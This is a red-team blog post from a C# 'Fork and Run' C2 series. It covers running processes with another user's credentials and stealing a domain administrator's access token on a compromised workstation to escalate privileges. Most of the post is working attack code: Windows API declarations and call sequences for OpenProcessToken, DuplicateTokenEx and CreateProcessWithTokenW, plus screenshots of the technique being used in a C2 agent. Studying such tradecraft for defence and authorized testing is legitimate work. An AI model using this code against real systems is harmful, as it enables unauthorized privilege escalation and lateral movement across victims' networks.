---
title: Fork and Run Implementation in C# - User impersonation & Token Manipulation
author: Fropops
date: 2023-06-13 08:10:00 +0800
categories: [Developpement]
tags: [C#, C2, Red Team, Fork and Run, Injection, WinAPI, Command Execution]
---

# Introduction

In the previous article ([Process Creation](/posts/Fork-and-Run-CSharp-Process-Creation/)) of this [Fork And Run](/posts/Fork-and-Run-CSharp-Intro/) series, we saw how to create a new process using the Windows API and how to retrieve its output stream.

Before moving on to the injection part, let's stay a little longer in the realm of process creation for the duration of this article. Indeed, there is another widely used feature in C2: the ability to launch a process with the rights of another user.

In this article, we will explore the two main techniques used for this purpose:<br/>
The first option, if we have the credentials of another user, is to create the process in the context of that user.<br/>
The second option, if we have sufficient privileges on the target computer, allows us to duplicate the rights of another process.<br/>


# User Impersonation

We can use the Windows API to create a process by using the login and password of a user. To do this, we simply need to use the function CreateProcessWithLogonW instead of CreateProcessW. This function is available in the advanced functions DLL (advapi32.dll).

We need to add its definition to our project in order to invoke it:
```c#
[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithLogonW(
	string lpUsername,
	string lpDomain,
	string lpPassword,
	uint dwLogonFlags,
	string lpApplicationName,
	string lpCommandLine,
	uint dwCreationFlags,
	IntPtr lpEnvironment,
	string lpCurrentDirectory,
	[In] ref STARTUPINFOEX lpStartupInfo,
	out PROCESS_INFORMATION lpProcessInformation);
```

We also need to add the associated flag:
```c#
[Flags]
public enum LOGON_FLAGS : uint
{
	LogonWithProfile = 0x00000001,
	LogonNetCredentialsOnly = 0x00000002,
}
```

In order to make it work, we also need to remove the following line : 
```c#
creationFlags |= PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT;
```

We can then call it with the appropriate parameters:

```c#
if (!CreateProcessWithLogonW(userName, domain, password, LOGON_FLAGS.LogonWithProfile, null, cmd, creationFlags, IntPtr.Zero, null, ref startupInfoEx, out pInfo))
    throw new InvalidOperationException($"Error in CreateProcessWithLogonW : {Marshal.GetLastWin32Error()}");
```

Here we go !

![Process Creation Impersonated Execution](/assets/img/posts/ForkAndRun/exec-creation-impersonated.png)

# Token manipulation

In Windows processes, a token refers to an object that represents the security context of a user or a system. It contains information about the user's identity, privileges, and group memberships, which are used to determine the access rights and permissions for the process.

When a user logs in to a Windows system, a token is created that contains their security credentials. This token is then associated with every process that the user starts or runs. The token carries information such as the user's security identifier (SID), user privileges, group SIDs, authentication information, and other relevant security data.

If we have sufficient privileges on a system, we have access to all user processes and their tokens! 

Let's imagine the following scenario: we have compromised a workstation and gained system access. By studying the current processes, we notice that the domain administrator is logged into this machine:

![Process List on workstation](/assets/img/posts/ForkAndRun/steal-token-processlist.png)

If we manage to steal the token from one of the Administrator's processes and inject it into a process that we create, we should obtain the access rights of the domain administrator! Once again, the Windows API provides us with everything we need for this manipulation.

There are 2 functions in the API that allow us to steal a token from an existing process and duplicate it:

 ```c#
[DllImport("advapi32.dll")]
public static extern bool OpenProcessToken(
	IntPtr ProcessHandle,
	DesiredAccess DesiredAccess,
	out IntPtr TokenHandle);

[DllImport("advapi32.dll")]
public extern static bool DuplicateTokenEx(
	IntPtr hExistingToken,
	TokenAccess dwDesiredAccess,
	ref SECURITY_ATTRIBUTES lpTokenAttributes,
	SecurityImpersonationLevel ImpersonationLevel,
	TokenType TokenType,
	out IntPtr phNewToken);
```

We need to declare associated structures:

```c#
public enum DesiredAccess : uint
{
	STANDARD_RIGHTS_REQUIRED = 0x000F0000,
	STANDARD_RIGHTS_READ = 0x00020000,
	TOKEN_ASSIGN_PRIMARY = 0x0001,
	TOKEN_DUPLICATE = 0x0002,
	TOKEN_IMPERSONATE = 0x0004,
	TOKEN_QUERY = 0x0008,
	TOKEN_QUERY_SOURCE = 0x0010,
	TOKEN_ADJUST_PRIVILEGES = 0x0020,
	TOKEN_ADJUST_GROUPS = 0x0040,
	TOKEN_ADJUST_DEFAULT = 0x0080,
	TOKEN_ADJUST_SESSIONID = 0x0100,
	TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),

	TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
	TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
	TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
	TOKEN_ADJUST_SESSIONID)
}

public enum TokenAccess : uint
{
	TOKEN_ASSIGN_PRIMARY = 0x0001,
	TOKEN_DUPLICATE = 0x0002,
	TOKEN_IMPERSONATE = 0x0004,
	TOKEN_QUERY = 0x0008,
	TOKEN_QUERY_SOURCE = 0x0010,
	TOKEN_ADJUST_PRIVILEGES = 0x0020,
	TOKEN_ADJUST_GROUPS = 0x0040,
	TOKEN_ADJUST_DEFAULT = 0x0080,
	TOKEN_ADJUST_SESSIONID = 0x0100,
	TOKEN_ALL_ACCESS_P = 0x000F00FF,
	TOKEN_ALL_ACCESS = 0x000F01FF,
	TOKEN_READ = 0x00020008,
	TOKEN_WRITE = 0x000200E0,
	TOKEN_EXECUTE = 0x00020000
}

public enum TokenType
{
	TOKEN_PRIMARY = 1,
	TOKEN_IMPERSONATION
}

public enum SecurityImpersonationLevel
{
	SECURITY_ANONYMOUS,
	SECURITY_IDENTIFICATION,
	SECURITY_IMPERSONATION,
	SECURITY_DELEGATION
}
```

We can now retrieve the token using the process ID:

```c#
var processSrc = Process.GetProcessById(processId);

//open handle to token
if (!OpenProcessToken(processSrc.Handle, DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
	throw new InvalidOperationException($"Failed to open process token");


//duplicate  token
var sa = new SECURITY_ATTRIBUTES();
if (!DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa, SecurityImpersonationLevel.SECURITY_IMPERSONATION, TokenType.TOKEN_IMPERSONATION, out hTokenDup))
{
	CloseHandle(hToken);
	throw new InvalidOperationException($"Failed to duplicate token");
}
```

All that's left is to create a process by injecting the retrieved token. For this, we will use the CreateProcessWithTokenW function:

```c#
[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(
   IntPtr hToken,
   uint dwLogonFlags,
   string lpApplicationName,
   string lpCommandLine,
   uint dwCreationFlags,
   IntPtr lpEnvironment,
   string lpCurrentDirectory,
   [In] ref STARTUPINFOEX lpStartupInfo,
   out PROCESS_INFORMATION lpProcessInformation);
```

We replace the call to the CreateProcessW function with:

```c#
if (!CreateProcessWithTokenW(hTokenDup, (uint)LOGON_FlAGS.LogonWithProfile, null, cmd, (uint)creationFlags, IntPtr.Zero, null, ref startupInfoEx, out pInfo))
	throw new InvalidOperationException($"Error in CreateProcessWithTokenW : {Marshal.GetLastWin32Error()}");
```

And here is the result:

![Simple Process Execution - Steal Token](/assets/img/posts/ForkAndRun/steal-token-exec.png)

# What does it look like in our C2?

When integrated in the agent and running on the workstation as local Administrator, we try to enumerate the content of the C drive on the Domain Controller :

![Token STealing Execution in C2 - Standard user](/assets/img/posts/ForkAndRun/exec-steal-token-c2-before.png)

Let's find a process running as Domain Administrator :

![Token STealing Execution in C2 - Processes](/assets/img/posts/ForkAndRun/exec-steal-token-c2-ps.png)

Here we go !

![Token STealing Execution in C2 - Domain Admin](/assets/img/posts/ForkAndRun/exec-steal-token-c2-after.png)


# Final Thoughts

This article demonstrates how to create a new process in C# using the Windows API and impersonate or steal the rights of another user.

You can find the complete source code of this article on [Github](https://github.com/Fropops/OffensiveWinAPI/blob/main/TestForBlog/StealToken.cs)